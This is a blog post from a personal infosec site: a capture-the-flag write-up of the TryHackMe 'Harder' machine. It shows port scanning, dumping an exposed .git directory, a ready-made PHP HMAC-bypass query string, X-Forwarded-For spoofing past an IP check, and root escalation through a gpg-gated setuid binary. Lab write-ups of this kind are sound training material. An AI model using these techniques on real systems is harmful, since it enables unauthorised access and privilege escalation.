<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="map[name:Siva Rajendran]">
<meta name="description" content="The following write up is for the machine: Harder
Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="#252627" />
<link rel="canonical" href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-harder-writeup/" />


    <title>
        
            Tryhackme- Harder Writeup :: 0xSh1v4 Infosec Blog  — Writeups, CTFs
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://0xSh1v4.github.io/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://0xSh1v4.github.io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://0xSh1v4.github.io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://0xSh1v4.github.io/favicon-16x16.png">
    <link rel="manifest" href="https://0xSh1v4.github.io/site.webmanifest">
    <link rel="mask-icon" href="https://0xSh1v4.github.io/safari-pinned-tab.svg" color="#252627">
    <link rel="shortcut icon" href="https://0xSh1v4.github.io/favicon.ico">
    <meta name="msapplication-TileColor" content="#252627">
    <meta name="theme-color" content="#252627">



<meta itemprop="name" content="Tryhackme- Harder Writeup">
<meta itemprop="description" content="The following write up is for the machine: Harder
Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.">
<meta itemprop="datePublished" content="2020-09-10T00:00:00+00:00" />
<meta itemprop="dateModified" content="2020-09-10T00:00:00+00:00" />
<meta itemprop="wordCount" content="2029">
<meta itemprop="image" content="https://0xSh1v4.github.io"/>



<meta itemprop="keywords" content="" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://0xSh1v4.github.io"/>

<meta name="twitter:title" content="Tryhackme- Harder Writeup"/>
<meta name="twitter:description" content="The following write up is for the machine: Harder
Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas."/>



    <meta property="og:title" content="Tryhackme- Harder Writeup" />
<meta property="og:description" content="The following write up is for the machine: Harder
Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xSh1v4.github.io/posts/2020/09/tryhackme-harder-writeup/" />
<meta property="og:image" content="https://0xSh1v4.github.io"/>
<meta property="article:published_time" content="2020-09-10T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-09-10T00:00:00+00:00" />







    <meta property="article:published_time" content="2020-09-10 00:00:00 &#43;0000 UTC" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://0xSh1v4.github.io/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">$ sudo -l</span>
            <span class="logo__cursor" style=
                  "
                   
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://0xSh1v4.github.io/posts/">CTF Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        10 minutes reading time

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-harder-writeup/">Tryhackme- Harder Writeup</a>
      </h1>

      

      <div class="post-content">
        <p>The following write up is for the machine: Harder</p>
<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
<h2 id="synopsis">Synopsis</h2>
<p><a href="https://www.tryhackme.com/room/harder">Harder</a> is the boot2root machine which reflects the real-life pentest scenario. I liked this box so much, I learned so much out of this box. It took me many hours to figure out and understand many concepts while doing this box. At somepoint, my pentesting experince helped me to crack few things. This box has lots of things ranging from sub-domain enumeration, code analysis, web bypass mechanisms and also with GPG. It was really a hard box for me to root.</p>
<h2 id="scanning-and-enumeration-the-network">Scanning and Enumeration the network</h2>
<p>As usual, let us run the nmap tool to can the target network.</p>
<h3 id="nmap-results">Nmap Results:</h3>
<p>As usual I tried to run the scan with the following command.</p>
<pre><code>nmap -sC -sV -oA top 10.10.124.177
</code></pre><p>But I haven&rsquo;t found any results. So, I tried using the Masscan to check all the ports.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Harder]
└─$ sudo masscan -p1-65535 10.10.124.177 --rate=1000 -e tun0   
Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-13 20:09:11 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 80/tcp on 10.10.124.177                                   
Discovered open port 22/tcp on 10.10.124.177                                   
Discovered open port 2/tcp on 10.10.124.177
</code></pre><p>So, we have found 3 open ports. so, now lets try to run the nmap to find the service for these ports.</p>
<p>We have got the following results.</p>
<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Harder]
└─$ nmap -sC -sV -p80,22,2 -oA top 10.10.124.177                                                                                                                                                                                          1 ⨯
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 22:13 CEST
Nmap scan report for 10.10.124.177
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
2/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f8:8c:1e:07:1d:f3:de:8a:01:f1:50:51:e4:e6:00:fe (RSA)
|   256 e6:5d:ea:6c:83:86:20🇩🇪f0:f0:3a:1e:5f:7d:47:b5 (ECDSA)
|_  256 e9:ef:d3:78:db:9c:47:20:7e:62:82:9d:8f:6f:45:6a (ED25519)
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Error
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds
</code></pre><p>The webpage on port 80 looks below.
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/1.png"
         alt="Tryhackme: Harder machine -Index.html Page"/> <figcaption>
            <p>Tryhackme: Harder machine -Index.html Page</p>
        </figcaption>
</figure>
</p>
<h3 id="gobuster-results">Gobuster Results:</h3>
<p>From the scan results, we found the following phpinfo.php page
We could see it used nginx and php-fm.
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/2.png"
         alt="Tryhackme: Harder machine - info.php page"/> <figcaption>
            <p>Tryhackme: Harder machine - info.php page</p>
        </figcaption>
</figure>
</p>
<h4 id="burp-request">Burp Request</h4>
<pre><code>GET /download HTTP/1.1
Host: 10.10.124.177
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
</code></pre><p>while intercepting with the Burp, we found the following response.</p>
<h4 id="burp-response">Burp Response</h4>
<pre><code>HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sun, 13 Sep 2020 20:37:49 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
X-Powered-By: PHP/7.3.19
Set-Cookie: TestCookie=just+a+test+cookie; expires=Sun, 13-Sep-2020 21:37:49 GMT; Max-Age=3600; path=/; domain=**pwd.harder.local**; secure
Content-Length: 1985

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
</code></pre><p>From this we found the domain: <strong>pwd.harder.local</strong> in the response-cookie
So lets add this domain in the /etc/hosts.</p>
<p>Now, we have found the webpage login form and I have tried to bruteforce the dir using Gobuster.</p>
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/3.png"
         alt="Tryhackme: Harder machine - Login Page in pwd.harder.local"/> <figcaption>
            <p>Tryhackme: Harder machine - Login Page in pwd.harder.local</p>
        </figcaption>
</figure>

<p>So, I have tried <em>admin/admin</em> and we got in, but there was a security check in the page.
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/4.png"
         alt="Tryhackme: Harder machine - Security Check after Login Success"/> <figcaption>
            <p>Tryhackme: Harder machine - Security Check after Login Success</p>
        </figcaption>
</figure>
</p>
<p>So, I have tried Dirb and gobuster with different wordlists.</p>
<p>I have found a interesting .git directory via dirb and found three locations with gobuster.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Harder]
└─$ dirb http://pwd.harder.local                                                                   

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Sep 14 00:05:24 2020
URL_BASE: http://pwd.harder.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://pwd.harder.local/ ----
+ http://pwd.harder.local/.git/HEAD (CODE:200|SIZE:23)
</code></pre><figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/5.png"
         alt="Tryhackme: Harder machine - Gobuster Results"/> <figcaption>
            <p>Tryhackme: Harder machine - Gobuster Results</p>
        </figcaption>
</figure>

<p>But I have tried to check these files, but it was not available in the application.</p>
<p>there is definitely a .git directory on the server.</p>
<p>So, I used a tool called <a href="https://github.com/arthaud/git-dumper">git-dumper</a> to download all the files. 
For some reason, I could not able to install the tool in Kali, so I tried on my windows to fetch the files and saves it. So I can use it later in my Kali to examine the infos.</p>
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/6.png"
         alt="Tryhackme: Harder machine -Git-Dumper Results"/> <figcaption>
            <p>Tryhackme: Harder machine -Git-Dumper Results</p>
        </figcaption>
</figure>

<h2 id="exploitation-of-the-network">Exploitation of the network</h2>
<p>So, I have found three files from the git.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/…/PenTest/Tryhackme/Harder/Github_results]
└─$ ls -la
total 24
drwxrwxrwx 1 zeus zeus  4096 Sep 14 21:47 .
drwxrwxrwx 1 zeus zeus  4096 Sep 14 21:47 ..
drwxrwxrwx 1 zeus zeus  4096 Sep 14 21:47 .git
-rwxrwxrwx 1 zeus zeus    29 Sep 14 21:47 .gitignore
-rwxrwxrwx 1 zeus zeus 23951 Sep 14 21:47 auth.php
-rwxrwxrwx 1 zeus zeus   449 Sep 14 21:47 hmac.php
-rwxrwxrwx 1 zeus zeus   628 Sep 14 21:47 index.php
</code></pre><p>AFter carefully looking into the file, Inside auth.php file, there is a login function which checks for login and password where it also mentioned that the login and password should be <em>admin</em> and <em>admin</em></p>
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/7.png"
         alt="Tryhackme: Harder machine - Auth.php file"/> <figcaption>
            <p>Tryhackme: Harder machine - Auth.php file</p>
        </figcaption>
</figure>

<p>Inside hmac.php file,</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/…/PenTest/Tryhackme/Harder/Github_results]
└─$ cat hmac.php 
&lt;?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print(&quot;missing get parameter&quot;);
   die();
}
require(&quot;secret.php&quot;); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}

$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print(&quot;extra security check failed&quot;);
  die();
}
</code></pre><p>What this script does is, first it checks if the parameter <strong>h</strong> or the <strong>host</strong> parameter is being set or else it will display error.
Second if , it checks if the parameter <strong>n</strong> is set and then it computes the hash with secret key which takes value from secret.php file. unfortunately, we don&rsquo;t have the secret.php file.
Later, it compares the value from $hm and $secret (which has the updated hash now) and if fails, it displays the error which we saw before in the screenshot.</p>
<p>We can&rsquo;t find the value of $_GET[&lsquo;h&rsquo;] without knowing the value in secret.php file. we need to bypass the HMAC check to get the required infos. 
Read here: <a href="https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up">Bypass-Article</a></p>
<p><strong>Note: It was very difficult for me to find this article, I have looked into the old writeup to find this article link and then cracked this setp alone.</strong></p>
<p>As per this article, there is a possibilitiy to generate our hmac for messages when array is being supplied as an input.</p>
<p>Once we supply n as array then the $secret is set to false.
Then, in the next $hm statement, it calculates the value with the $secret as false.</p>
<p><code>hash_hmac('sha256', &quot;securify.nl&quot;, false) = c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5</code></p>
<p>So, we could use the below payload and get the new infos.</p>
<p><code>/?n[]=&amp;host=securify.nl&amp;h=c8ef9458af67da9c9086078ad3acc8ae71713af4e27d35fd8d02d0078f7ca3f5</code></p>
<p>Once you logged in, add this value and press enter, you will get the following creds.</p>
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/8.png"
         alt="Tryhackme: Harder machine - Found credentials"/> <figcaption>
            <p>Tryhackme: Harder machine - Found credentials</p>
        </figcaption>
</figure>

<p>Now lets add this url  <a href="http://shell.harder.local">http://shell.harder.local</a> in the hosts file.</p>
<p>So, I have opened the login page and used the creds which we got. It gave me the following error.</p>
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/9.png"
         alt="Tryhackme: Harder machine - Visiting the shell.harder.local subdomain"/> <figcaption>
            <p>Tryhackme: Harder machine - Visiting the shell.harder.local subdomain</p>
        </figcaption>
</figure>

<p>So according to this error, the server request does not show any info if our ip is not in 10.10.10.x</p>
<p>This kind of scenario, I have experienced during my pentest. So, that experience helped me to identify it immediately.</p>
<p>we could just add <strong>X-Forwarded-For</strong> in our web request via burp with this Ip range and we could bypass this check.</p>
<p>Read more below: <a href="https://portswigger.net/kb/issues/00400110_spoofable-client-ip-address">Burp-Spoofable-client-ip</a></p>
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/10.png"
         alt="Tryhackme: Harder machine - Adding X-forwarded-for in Burp"/> <figcaption>
            <p>Tryhackme: Harder machine - Adding X-forwarded-for in Burp</p>
        </figcaption>
</figure>

<p>Now, It is possible to execute a shell via this page. when displying this in browser, we got the following info.
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/11.png"
         alt="Tryhackme: Harder machine - Command Execution Page"/> <figcaption>
            <p>Tryhackme: Harder machine - Command Execution Page</p>
        </figcaption>
</figure>
</p>
<p>So, now lets to add a reverse shell and get a connection back. I could not able to get the shell back. So, I tried to execute the command and got the user flag.</p>
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/12.png"
         alt="Tryhackme: Harder machine -obtained User.txt by command execution"/> <figcaption>
            <p>Tryhackme: Harder machine -obtained User.txt by command execution</p>
        </figcaption>
</figure>

<p>Still, need to find a way to get a shell into the system. I found the machine has python3 installed and tried to pass the python3 webshell payload and got a connection success message, but it couldn&rsquo;t popup the shell.</p>
<p>After enumerating for long time, I tried to find some interesting files.</p>
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/13.png"
         alt="Tryhackme: Harder machine -Found Shell Files"/> <figcaption>
            <p>Tryhackme: Harder machine -Found Shell Files</p>
        </figcaption>
</figure>

<p>Found a file in /etc/ for evs-backup. (rev.sh is the shell which I transferred before to get a shell., but din&rsquo;T work out.)</p>
<figure>
    <img src="https://0xSh1v4.github.io/Tryhackme/Harder/14.png"
         alt="Tryhackme: Harder machine -Found the credentials from the machine"/> <figcaption>
            <p>Tryhackme: Harder machine -Found the credentials from the machine</p>
        </figcaption>
</figure>

<p>Now, we have obtained ssh creds for evs with the password. Lets finally get into the box via shell.</p>
<h2 id="privilege-escaltion">Privilege Escaltion</h2>
<p>Now we have got into the box.</p>
<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Harder]
└─$ ssh evs@10.10.93.40
evs@10.10.93.40's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;http://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

harder:~$ whoami
evs
</code></pre><p>Then, I have tried to enumerate the system with different command and looking for SUID binaries.</p>
<pre><code>harder:/$ find / -perm -u=s -type f 2&gt;/dev/null
/usr/local/bin/execute-crypted
harder:/$ /usr/local/bin/execute-crypted
[*] Current User: root
[-] This program runs only commands which are encypted for root@harder.local using gpg.
[-] Create a file like this: echo -n whoami &gt; command
[-] Encrypt the file and run the command: execute-crypted command.gpg
</code></pre><p>Luckily, I found the an binary executable which runs only for <a href="mailto:root@harder.local">root@harder.local</a>.</p>
<p>Then, I started to look for the keys inside the system and found the public key.</p>
<pre><code>harder:/var/backup$ ls
root@harder.local.pub
</code></pre><p>Then I tried to import the keys.</p>
<pre><code>harder:~$ gpg --import /var/backup/root@harder.local.pub
gpg: key C91D6615944F6874: public key &quot;Administrator &lt;root@harder.local&gt;&quot; imported
gpg: Total number processed: 1
gpg:               imported: 1
harder:~$ gpg --list-keys
/home/evs/.gnupg/pubring.kbx
----------------------------
pub   ed25519 2020-07-07 [SC]
      6F99621E4D64B6AFCE56E864C91D6615944F6874
uid           [ unknown] Administrator &lt;root@harder.local&gt;
sub   cv25519 2020-07-07 [E]

harder:~$  gpg -e -r &quot;Administrator&quot; test
gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user

sub  cv25519/6C1C04522C049868 2020-07-07 Administrator &lt;root@harder.local&gt;
 Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y
harder:~$ ls -la
total 36
drwxr-sr-x    1 evs      evs           4096 Sep 14 22:52 .
drwxr-xr-x    1 root     root          4096 Jul  7 22:28 ..
-rw-------    1 evs      evs           2224 Sep 14 22:58 .ash_history
drwx--S---    4 evs      evs           4096 Sep 14 22:58 .gnupg
-rw-r--r--    1 evs      evs             19 Sep 14 22:34 test
-rw-r--r--    1 evs      evs            177 Sep 14 22:58 test.gpg
-rw-r--r--    1 evs      evs            522 Sep 14 22:52 test.gpg.gpg
-rw-r--r--    1 evs      evs             33 Jul  6 22:02 user.txt
harder:~$ /usr/local/bin/execute-crypted test.gpg
gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
      &quot;Administrator &lt;root@harder.local&gt;&quot;
3a7[REDACTED]xx6c
</code></pre><p>Now, we got the root flag from the machine.</p>
<p>Inside test file, I had the following code to print the contents from root.txt.</p>
<pre><code>harder:~$ cat test
cat /root/root.txt
</code></pre><p>Now, lets try to get the admin shell on the machine.</p>
<p>Tried many things, but dint workout. FInally created a ssh keys in my local machine and added it to the /root/.ssh/authorized_keys which I have created and executed the binary to make the root to add it into his authorized keys file and then I have ssh&rsquo;ed into the box to get the root shell.</p>
<pre><code>──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/Harder]
└─$ ssh -i /home/zeus/.ssh/admin root@10.10.93.40
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;http://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

harder:~# whoami
root
harder:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
</code></pre><p>And thats how I rooted the box. It was a long process and took me several hours, I looked the hints twice when I got struck somewhere for longtime. At the end , I learned so much.</p>
<p>Thanks for reading! Prost! 🍺</p>
<p>If you have any questions: Feel free to contact me.</p>
<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
<p><figure>
    <img src="https://0xSh1v4.github.io/HTB_profile.png"
         alt="HTB_Profile"/> 
</figure>

<figure>
    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
         alt="Tryhackme"/> 
</figure>
</p>

      </div>
    </article>

    <hr />

    <div class="post-info">

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        2029 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        2020-09-10 02:00 &#43;0200
      </p>
    </div>
      <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=Tryhackme-%20Harder%20Writeup&amp;caption=Tryhackme-%20Harder%20Writeup&amp;canonicalUrl=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=Tryhackme-%20Harder%20Writeup&amp;body=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f&amp;media=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-harder-writeup%2f;description=Tryhackme-%20Harder%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


